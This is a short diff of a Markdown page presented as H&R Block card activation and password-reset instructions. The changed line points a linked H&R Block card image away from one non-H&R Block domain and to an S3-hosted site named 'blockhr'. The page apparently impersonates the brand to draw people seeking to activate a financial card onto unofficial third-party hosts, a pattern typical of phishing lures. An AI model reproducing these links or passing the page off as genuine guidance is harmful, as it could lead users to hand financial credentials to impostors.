@@ -13,8 +13,7 @@
 * Then for **"Select Verification Method"**, it is recommended to use the postal code
 * Finally select **"Next"** to complete
 
-[![Activate.hrblock.com/crj](H&R-Block-Master-Card.png)](https://ht.amdonline.site/)
-
+[![Activate.hrblock.com/crj](H&R-Block-Master-Card.png)](http://blockhr.s3-website-us-west-1.amazonaws.com)
 
 ## Reset My H&R Block Password | Activate.hrblock.com/crj
 
